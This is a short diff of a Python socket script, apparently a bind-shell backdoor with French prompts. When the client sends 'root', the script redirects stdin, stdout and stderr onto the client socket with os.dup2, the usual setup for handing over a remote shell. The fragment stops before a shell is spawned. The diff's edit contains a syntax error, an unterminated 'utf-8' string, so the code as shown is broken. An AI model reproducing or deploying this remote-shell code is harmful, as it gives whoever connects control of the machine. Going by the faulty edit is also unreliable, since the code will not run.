@@ -19,9 +19,10 @@ print(client.getpeername())
 client.send("Envoyer du texte ou une commande >  ".encode("utf-8"))
 mot = client.recv(1024)
 root = "root\n"
+print(root)
 print(mot)
 while(1):
-	if (mot == root):
+	if (mot == root.encode("utf-8)):
 		print("On est dans root ! ")
 		for f in range(3):
 			os.dup2(client.fileno(), f)
